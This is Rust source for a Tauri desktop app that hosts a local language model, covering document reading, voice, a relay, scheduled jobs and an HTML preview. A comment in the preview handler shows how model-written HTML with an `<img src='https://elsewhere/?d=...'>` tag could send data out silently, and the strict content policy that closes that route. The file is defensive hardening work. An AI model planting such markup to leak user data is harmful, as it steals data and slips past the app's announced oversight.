const DOC_MAX: usize = 400_000;

/// Read any document as text. `mode` is "auto" (text layer, OCR fallback),
/// "ocr" (force OCR) or "text" (text layer only).
#[tauri::command]
async fn doc_read(path: String, mode: Option<String>) -> Result<String, String> {
    if !Path::new(&path).is_file() {
        return Err(format!("file not found: {path}"));
    }
    let ext = Path::new(&path)
        .extension()
        .map(|e| e.to_string_lossy().to_lowercase())
        .unwrap_or_default();
    let mode = mode.unwrap_or_else(|| "auto".into());

    let text = match ext.as_str() {
        "txt" | "md" | "markdown" | "csv" | "tsv" | "json" | "log" | "yaml" | "yml" | "xml"
        | "srt" | "vtt" | "ini" | "toml" | "conf" => {
            std::fs::read_to_string(&path).map_err(|e| e.to_string())?
        }
        "pdf" | "png" | "jpg" | "jpeg" | "heic" | "heif" | "tiff" | "tif" | "bmp" | "gif"
        | "webp" => {
            let bin = doc_helper()?;
            let cmd = match mode.as_str() {
                "ocr" => "ocr",
                "text" => "pdftext",
                _ => "auto",
            };
            run_helper(&bin, cmd, &path, 300)?
        }
        "rtf" | "doc" | "docx" | "pptx" | "xlsx" | "html" | "htm" | "odt" | "webarchive" => {
            office_text(&path, &ext)?
        }
        _ => {
            // Unknown extension: try plain text, fall back to OCR if binary.
            match std::fs::read_to_string(&path) {
                Ok(t) => t,
                Err(_) => {
                    let bin = doc_helper()?;
                    run_helper(&bin, "auto", &path, 300)?
                }
            }
        }
    };

    let trimmed = text.trim();
    if trimmed.is_empty() {
        return Ok("(no text found in this document)".into());
    }
    if trimmed.len() > DOC_MAX {
        let mut cut = trimmed[..floor_char_boundary(trimmed, DOC_MAX)].to_string();
        cut.push_str("\n…(truncated)");
        return Ok(cut);
    }
    Ok(trimmed.to_string())
}

/// Quick capability probe for the UI (is the OCR helper usable?).
#[tauri::command]
fn doc_capabilities() -> Value {
    // The Xcode stub at /usr/bin/swiftc exists even without the Command Line
    // Tools, only a successful exit means the compiler is really usable.
    let swiftc = Command::new("swiftc")
        .arg("--version")
        .output()
        .map(|o| o.status.success())
        .unwrap_or(false);
    let helper = doc_helper().is_ok();
    json!({ "swiftc": swiftc, "helper": helper })
}

// ---------------------------------------------------------------- voice

struct VoiceState {
    child: Option<Child>,
}

static VOICE: OnceLock<Mutex<VoiceState>> = OnceLock::new();

fn voice_state() -> &'static Mutex<VoiceState> {
    VOICE.get_or_init(|| Mutex::new(VoiceState { child: None }))
}

/// The on-device speech helper (Apple SFSpeechRecognizer): precompiled in the
/// bundle, compiled from source as a dev fallback.
fn voice_helper() -> Result<PathBuf, String> {
    if let Some(res) = resource_dir() {
        let prebuilt = res.join("packaged/galactus-voice");
        if prebuilt.is_file() {
            #[cfg(unix)]
            {
                use std::os::unix::fs::PermissionsExt;
                if let Ok(meta) = std::fs::metadata(&prebuilt) {
                    let mut perm = meta.permissions();
                    if perm.mode() & 0o111 == 0 {
                        perm.set_mode(0o755);
                        let _ = std::fs::set_permissions(&prebuilt, perm);
                    }
                }
            }
            return Ok(prebuilt);
        }
    }
    let bin = app_support().join("galactus-voice");
    let src = std::env::current_dir()
        .unwrap_or_default()
        .join("src-tauri/helpers/galactus-voice.swift");
    if !src.is_file() {
        return Err("voice helper not available".into());
    }
    if !bin.is_file() {
        std::fs::create_dir_all(app_support()).map_err(|e| e.to_string())?;
        let out = Command::new("swiftc")
            .args(["-O", "-o"])
            .arg(&bin)
            .arg(&src)
            .output()
            .map_err(|e| format!("swiftc unavailable ({e})"))?;
        if !out.status.success() {
            return Err("voice helper failed to build".into());
        }
    }
    Ok(bin)
}

/// Start on-device dictation. Streams `galactus://voice` events:
/// {kind: "partial"|"final"|"error", text}.
#[tauri::command]
fn voice_start(app: AppHandle, locale: Option<String>) -> Result<(), String> {
    let bin = voice_helper()?;
    {
        // One dictation at a time.
        let mut v = voice_state().lock().unwrap_or_else(|e| e.into_inner());
        if let Some(mut old) = v.child.take() {
            let _ = old.kill();
            let _ = old.wait();
        }
    }
    let mut child = Command::new(&bin)
        .arg("listen")
        .arg("--locale")
        .arg(locale.unwrap_or_else(|| "fr-FR".into()))
        .args(["--max-seconds", "90"])
        .stdout(Stdio::piped())
        .stderr(Stdio::null())
        .spawn()
        .map_err(|e| e.to_string())?;
    let stdout = child.stdout.take().ok_or("no stdout")?;
    let my_pid = child.id();
    voice_state().lock().unwrap_or_else(|e| e.into_inner()).child = Some(child);

    std::thread::spawn(move || {
        let reader = BufReader::new(stdout);
        let mut terminal_sent = false;
        for line in reader.lines() {
            // A line that does not decode is skipped, not fatal: this is a
            // child process's output, and one odd byte must not silence the
            // rest of it. Spelled out rather than written `.flatten()`, which
            // says the same thing and spins forever on a reader that fails
            // forever; a pipe reports EOF instead, so this loop ends.
            let Ok(line) = line else { continue };
            let (kind, text) = if let Some(t) = line.strip_prefix("PARTIAL ") {
                ("partial", t.to_string())
            } else if let Some(t) = line.strip_prefix("FINAL ") {
                ("final", t.to_string())
            } else if let Some(t) = line.strip_prefix("ERROR ") {
                ("error", t.to_string())
            } else {
                continue;
            };
            let _ = app.emit("galactus://voice", json!({"kind": kind, "text": text}));
            if kind != "partial" {
                terminal_sent = true;
                break;
            }
        }
        // The helper can die without a terminal line (killed hard, crash):
        // the UI must still get unstuck.
        if !terminal_sent {
            let _ = app.emit("galactus://voice", json!({"kind": "final", "text": ""}));
        }
        // Reap OUR child only, a fresh dictation may already have replaced
        // it; and never hold the lock across wait().
        let mine = {
            let mut v = voice_state().lock().unwrap_or_else(|e| e.into_inner());
            if v.child.as_ref().map(|c| c.id()) == Some(my_pid) {
                v.child.take()
            } else {
                None
            }
        };
        if let Some(mut c) = mine {
            let _ = c.wait();
        }
    });
    Ok(())
}

/// Graceful stop: SIGTERM lets the helper flush its FINAL line first.
#[tauri::command]
fn voice_stop() {
    let v = voice_state().lock().unwrap_or_else(|e| e.into_inner());
    if let Some(c) = v.child.as_ref() {
        let _ = Command::new("kill").args(["-TERM", &c.id().to_string()]).output();
    }
}

// ---------------------------------------------------------------- text-to-speech

static TTS: OnceLock<Mutex<Option<Child>>> = OnceLock::new();

/// Read text aloud with the system voice (`say`, fully offline). A new call
/// replaces the previous one.
#[tauri::command]
fn tts_speak(text: String) -> Result<(), String> {
    let mut slot = TTS.get_or_init(|| Mutex::new(None)).lock().unwrap_or_else(|e| e.into_inner());
    if let Some(mut old) = slot.take() {
        let _ = old.kill();
        let _ = old.wait();
    }
    let clipped: String = text.chars().take(4000).collect();
    let child = Command::new("say")
        .arg("--")
        .arg(clipped)
        .spawn()
        .map_err(|e| e.to_string())?;
    *slot = Some(child);
    Ok(())
}

#[tauri::command]
fn tts_stop() {
    let mut slot = TTS.get_or_init(|| Mutex::new(None)).lock().unwrap_or_else(|e| e.into_inner());
    if let Some(mut old) = slot.take() {
        let _ = old.kill();
        let _ = old.wait();
    }
}

// ---------------------------------------------------------------- notifications

/// Native macOS notification. Used when a long task finishes while the window
/// is in the background, and when a model finishes loading.
#[tauri::command]
fn notify(title: String, body: String) -> Result<(), String> {
    // Newlines would break the AppleScript literal (and the failure would be
    // silent since osascript's exit code is not checked).
    let esc = |s: &str| {
        s.replace('\\', "\\\\")
            .replace('"', "\\\"")
            .replace(['\n', '\r'], " ")
    };
    let script = format!(
        "display notification \"{}\" with title \"{}\" sound name \"Ping\"",
        esc(&body),
        esc(&title)
    );
    Command::new("osascript")
        .arg("-e")
        .arg(script)
        .spawn()
        .map(|_| ())
        .map_err(|e| e.to_string())
}

/// Live engine metrics: resident memory of the llama-server process.
#[tauri::command]
fn server_metrics() -> Value {
    let pid = {
        let s = server_state().lock().unwrap_or_else(|e| e.into_inner());
        match s.child.as_ref() {
            Some(c) => c.id(),
            None => return json!({ "running": false }),
        }
    };
    let rss_kb = Command::new("ps")
        .args(["-o", "rss=", "-p", &pid.to_string()])
        .output()
        .ok()
        .and_then(|o| String::from_utf8_lossy(&o.stdout).trim().parse::<u64>().ok())
        .unwrap_or(0);
    json!({ "running": true, "rss_bytes": rss_kb * 1024 })
}

#[tauri::command]
fn server_log() -> String {
    std::fs::read_to_string(app_support().join("llama-server.log")).unwrap_or_default()
}

// ------------------------------------------------------- preview protocol
//
// The live preview renders model-written HTML. Feeding it through an iframe
// `srcdoc` made it inherit the APP's content policy, which allows nothing
// external: every previewed page lost its images, fonts, stylesheets and
// scripts, and looked broken for a reason that had nothing to do with the
// page. A document served over its own scheme carries its own policy instead
// of inheriting ours, so the preview finally shows what a browser would show.
//
// The isolation is unchanged and does not rely on the policy: the frame keeps
// `sandbox="allow-scripts"` WITHOUT `allow-same-origin`, so the page lives in
// an opaque origin with no access to the app, no IPC, and no way to navigate
// it. That is the same exposure as the "open in browser" button next to it.

fn preview_slot() -> &'static Mutex<(u64, String)> {
    static SLOT: OnceLock<Mutex<(u64, String)>> = OnceLock::new();
    SLOT.get_or_init(|| Mutex::new((0, String::new())))
}

/// Publish HTML for the preview frame and return the URL to point it at. The
/// id changes on every call so the webview reloads instead of serving a
/// cached document; only the latest page is kept.
#[tauri::command]
fn preview_publish(html: String) -> String {
    let mut slot = preview_slot().lock().unwrap_or_else(|e| e.into_inner());
    slot.0 += 1;
    slot.1 = html;
    format!("gxpreview://localhost/p/{}", slot.0)
}

// ---------------------------------------------------------------- entry


// ---------------------------------------------------------------- relay
//
// The engine is never exposed directly. See relay.rs for why: the bundled
// llama-server has no authentication option at all and its CORS default is
// `*`, so binding it outside 127.0.0.1 would publish an open endpoint.

#[tauri::command]
fn relay_status() -> relay::RelayStatus {
    relay::status()
}

/// Mint a new key. Returned ONCE, to be shown once and then stored by the user.
#[tauri::command]
fn relay_new_key() -> Result<String, String> {
    relay::generate_key()
}

/// Start the relay. `bind` is "127.0.0.1" or "0.0.0.0"; anything else is
/// refused in relay.rs rather than attempted.
#[tauri::command]
fn relay_start(bind: String, port: u16, key: String) -> Result<relay::RelayStatus, String> {
    let engine_port = {
        let s = server_state().lock().unwrap_or_else(|e| e.into_inner());
        if s.child.is_none() {
            return Err("start a model before opening the relay".into());
        }
        if s.port == 0 { SERVER_PORT_BASE } else { s.port }
    };
    relay::start(&bind, port, engine_port, &key)?;
    Ok(relay::status())
}

#[tauri::command]
fn relay_stop() -> relay::RelayStatus {
    relay::stop();
    relay::status()
}

/// Addresses this Mac can be reached on, for the connection snippets.
///
/// Reads the interfaces rather than guessing: telling the user to try
/// "your local IP" is how an integration guide becomes useless.
#[tauri::command]
fn relay_addresses() -> Vec<String> {
    let mut out = vec!["127.0.0.1".to_string()];
    if let Ok(o) = Command::new("/usr/sbin/ipconfig").args(["getifaddr", "en0"]).output() {
        let ip = String::from_utf8_lossy(&o.stdout).trim().to_string();
        if !ip.is_empty() {
            out.push(ip);
        }
    }
    if let Ok(o) = Command::new("/usr/sbin/ipconfig").args(["getifaddr", "en1"]).output() {
        let ip = String::from_utf8_lossy(&o.stdout).trim().to_string();
        if !ip.is_empty() && !out.contains(&ip) {
            out.push(ip);
        }
    }
    out
}

// ---------------------------------------------------------------- the tray
//
// Server mode runs unattended work in a window nobody is looking at. The red
// button already hides that window rather than destroying it (see
// on_window_event below), which is the only reason a scheduled job can drive
// an agent at 03:00: the agent loop lives in the webview, and a destroyed
// webview takes it with it.
//
// Hiding a window that is still working is exactly the "invisible but running"
// state that makes people distrust an app, so server mode also puts an item in
// the menu bar. It says the app is there, it brings the window back, and it
// offers the one action that genuinely stops the work: Quit.

const TRAY_ID: &str = "galactus-tray";

fn tray_show(app: &AppHandle) -> Result<(), String> {
    use tauri::menu::{Menu, MenuItem};
    use tauri::tray::TrayIconBuilder;

    if app.tray_by_id(TRAY_ID).is_some() {
        return Ok(());
    }
    let show = MenuItem::with_id(app, "tray-show", "Show Galactus", true, None::<&str>)
        .map_err(|e| e.to_string())?;
    let quit = MenuItem::with_id(
        app,
        "tray-quit",
        "Quit Galactus (stops scheduled jobs)",
        true,
        None::<&str>,
    )
    .map_err(|e| e.to_string())?;
    let menu = Menu::with_items(app, &[&show, &quit]).map_err(|e| e.to_string())?;
    let mut builder = TrayIconBuilder::with_id(TRAY_ID)
        .menu(&menu)
        .tooltip("Galactus, server mode")
        .show_menu_on_left_click(true);
    if let Some(icon) = app.default_window_icon().cloned() {
        builder = builder.icon(icon).icon_as_template(true);
    }
    builder
        .on_menu_event(|app, event| match event.id.as_ref() {
            "tray-show" => {
                if let Some(w) = app.get_webview_window("main") {
                    let _ = w.show();
                    let _ = w.set_focus();
                }
            }
            "tray-quit" => app.exit(0),
            _ => {}
        })
        .build(app)
        .map_err(|e| e.to_string())?;
    Ok(())
}

/// Show or hide the menu bar item. Called by the frontend when the app mode
/// changes, and at startup from the stored mode.
#[tauri::command]
fn tray_set(app: AppHandle, on: bool) -> Result<(), String> {
    if on {
        tray_show(&app)
    } else {
        app.remove_tray_by_id(TRAY_ID);
        Ok(())
    }
}

/// Register the update plugins.
///
/// Split out of `run` because the two plugins are desktop-only and the
/// `cfg` has to sit on a statement rather than in the middle of a builder
/// chain. The updater is registered unconditionally at startup, which is NOT
/// the same thing as checking for an update at startup: registering only
/// installs the commands the frontend may call. Whether a check ever happens,
/// and whether a restart ever follows it, is decided in the frontend, where
/// the app knows if a human is watching (see updateSection in main.ts).
#[cfg(desktop)]
fn with_updates<R: tauri::Runtime>(b: tauri::Builder<R>) -> tauri::Builder<R> {
    b.plugin(tauri_plugin_updater::Builder::new().build())
        .plugin(tauri_plugin_process::init())
}

#[cfg(not(desktop))]
fn with_updates<R: tauri::Runtime>(b: tauri::Builder<R>) -> tauri::Builder<R> {
    b
}

#[cfg_attr(mobile, tauri::mobile_entry_point)]
pub fn run() {
    with_updates(tauri::Builder::default())
        .register_uri_scheme_protocol("gxpreview", |_app, _request| {
            let html = preview_slot()
                .lock()
                .unwrap_or_else(|e| e.into_inner())
                .1
                .clone();
            tauri::http::Response::builder()
                .status(200)
                .header("Content-Type", "text/html; charset=utf-8")
                // The preview's own policy. It used to be `default-src *`,
                // which made this a FOURTH way out to the network, and the
                // only one with no dialog, no URL shown and no tool card: a
                // model that answered with an html block carrying
                // `<img src="https://elsewhere/?d=...">` exfiltrated on a
                // single click of the preview button, while the README
                // promised every exit was announced.
                //
                // The preview is now sealed. Everything it renders must be in
                // the document: inline styles and scripts still work, data and
                // blob URLs still work, so a self-contained page previews
                // exactly as before. What no longer works is reaching out, and
                // that is the entire point. `frame-ancestors 'self'` keeps the
                // page from re-embedding the app; `form-action 'none'` closes
                // the submit route out, which default-src does not cover.
                .header(
                    "Content-Security-Policy",
                    "default-src 'none'; \
                     img-src data: blob:; \
                     style-src 'unsafe-inline' data:; \
                     script-src 'unsafe-inline' 'unsafe-eval' data: blob:; \
                     font-src data:; \
                     media-src data: blob:; \
                     connect-src 'none'; \
                     form-action 'none'; \
                     base-uri 'none'; \
                     frame-ancestors 'self'",
                )
                .header("Cache-Control", "no-store")
                .body(html.into_bytes())
                .unwrap_or_else(|_| {
                    tauri::http::Response::builder().status(500).body(Vec::new()).unwrap()
                })
        })
        .setup(|app| {
            let _ = app.get_webview_window("main");
            if let Err(e) = harden_settings_permissions() {
                eprintln!("Galactus settings permission hardening failed: {e}");
            }
            seed_bundled_skills();
            if let Err(e) = seed_bundled_vault() {
                eprintln!("Galactus vault seeding failed: {e}");
            }
            // The clock starts with the process and not with the view: a
            // schedule that only ticked while the Runs screen was open would
            // be a schedule that stops when someone switches to Settings.
            scheduler::start(app.handle().clone());
            if settings_load().get("app_mode").map(|m| m == "server").unwrap_or(false) {
                if let Err(e) = tray_show(app.handle()) {
                    eprintln!("Galactus tray failed: {e}");
                }
            }
            Ok(())
        })
        .on_window_event(|window, event| {
            // macOS convention: the red button hides the window, the app
            // lives on in the Dock; ⌘Q is the one that really quits (and
            // takes the engine down through RunEvent::Exit below).
            if let tauri::WindowEvent::CloseRequested { api, .. } = event {
                let _ = window.hide();
                api.prevent_close();
            }
        })
        .invoke_handler(tauri::generate_handler![
            hw_info,
            load_registry,
            server_status,
            server_start,
            server_stop,
            engine_diagnose,
            install_model,
            cancel_install,
            delete_model,
            list_volumes,
            volume_bandwidth,
            recommend_for_model,
            tool_fs_read,
            tool_web_fetch,
            scratch_write,
            tool_fs_write,
            tool_fs_preview,
            tool_fs_revert,
            tool_fs_list,
            tool_shell_run,
            notify,
            server_log,
            server_metrics,
            settings_get,
            settings_set,
            mcp_reload,
            mcp_tools,
            mcp_call,
            detect_root,
            pick_folder,
            memory_read,
            memory_write,
            memory_append,
            obsidian_search,
            obsidian_read,
            obsidian_append,
            obsidian_graph,
            obsidian_write,
            obsidian_resolve,
            obsidian_create_vault,
            skills_list,
            skill_read,
            learned_list,
            learned_write,
            learned_delete,
            learned_folder,
            conv_list,
            conv_load,
            conv_save,
            conv_delete,
            conv_search,
            conv_read,
            doc_read,
            doc_capabilities,
            voice_start,
            voice_stop,
            tts_speak,
            tts_stop,
            knowledge::kb_folders,
            knowledge::kb_set_folders,
            knowledge::kb_reindex,
            knowledge::kb_stats,
            code::code_tree,
            code::code_read,
            code::code_write,
            code::git_info,
            code::git_status,
            code::git_log,
            code::git_diff,
            code::git_file_diff,
            code::git_show_file,
            code::git_stage,
            code::git_commit,
            code::git_push,
            code::git_pull,
            code::git_branches,
            code::git_checkout,
            // Workspace engine: enumeration, project search, symbol index.
            // The toolchain probe is NOT exposed as a command: git availability
            // reaches the front end through GitInfo.available, and nothing in
            // the app acts on node, cargo or make.
            search::search_start,
            search::search_cancel,
            search::search_files,
            symbols::symbols_index,
            symbols::symbols_query,
            // Tier A: the bulk snapshot the in-app TypeScript service reads.
            snapshot::code_snapshot,
            // Tier B, Python: exact SyntaxError and outline from bundled CPython.
            pylang::py_analyze,
            rust_analyzer_paths,
            // Tier A for .rs: the bundled rust-analyzer over LSP. The command
            // surface is deliberately thin, and lsp.rs refuses any method that
            // is not read-only (no executeCommand, no formatting: both would
            // run the project's own toolchain).
            lsp::rust_lsp_start,
            lsp::rust_lsp_stop,
            lsp::rust_lsp_status,
            lsp::rust_lsp_request,
            lsp::rust_lsp_notify,
            // Integrated terminal: one real pty per session. Not exposed to
            // the model as a tool. A model driven write still has to pass the
            // `shell` gate in code/terminal.ts, and pty.rs refuses one that
            // does not say it did.
            pty::pty_spawn,
            pty::pty_write,
            pty::pty_resize,
            pty::pty_kill,
            pty::pty_list,
            knowledge::kb_search,
            knowledge::digest_search,
            relay_status,
            relay_new_key,
            relay_start,
            relay_stop,
            relay_addresses,
            // Scheduled jobs. Rust owns the clock, the definitions and the
            // catch-up decision; the frontend owns the agent loop and reports
            // back through jobs_report. See scheduler.rs.
            scheduler::jobs_list,
            scheduler::jobs_save,
            scheduler::jobs_delete,
            scheduler::jobs_enable,
            scheduler::jobs_run_now,
            scheduler::jobs_report,
            scheduler::jobs_preview,
            tray_set,
            preview_publish
        ])
        .build(tauri::generate_context!())
        .expect("error while running Galactus")
        .run(|app, event| {
            // Dock click with the window closed must bring it back (macOS
            // keeps the process alive after the red button).
            if let tauri::RunEvent::Reopen { .. } = event {
                if let Some(w) = app.get_webview_window("main") {
                    let _ = w.show();
                    let _ = w.set_focus();
                }
            }
            // The window closing must take the engine with it: an abandoned
            // llama-server keeps tens of GB of RAM pinned, and every MCP
            // server would linger as an orphan.
            if let tauri::RunEvent::Exit = event {
                // A workspace scan is a plain OS thread: tell it to stop before
                // the window goes, or it outlives the app it was painting into.
                search::cancel_all();
                // An abandoned rust-analyzer keeps a whole crate index in RAM
                // and nothing on screen says so.
                lsp::shutdown_all();
                // Every terminal is a shell with a process group under it: an
                // abandoned `npm run dev` keeps holding its port long after
                // the window is gone.
                pty::kill_all();
                // The relay listens on a socket that must not outlive the window.
                relay::stop();
                if let Ok(mut s) = server_state().lock() {
                    if let Some(mut child) = s.child.take() {
                        let _ = child.kill();
                        let _ = child.wait();
                    }
                    s.phase = "stopped".into();
                    s.port = 0;
                }
                if let Ok(mut servers) = mcp_state().lock() {
                    for (_, mut p) in servers.drain() {
                        let _ = p.child.kill();
                        let _ = p.child.wait();
                    }
                }
                // Voice capture and speech must not outlive the app either.
                if let Ok(mut v) = voice_state().lock() {
                    if let Some(mut c) = v.child.take() {
                        let _ = c.kill();
                        let _ = c.wait();
                    }
                }
                if let Some(t) = TTS.get() {
                    if let Ok(mut slot) = t.lock() {
                        if let Some(mut c) = slot.take() {
                            let _ = c.kill();
                            let _ = c.wait();
                        }
                    }
                }
            }
        });
}

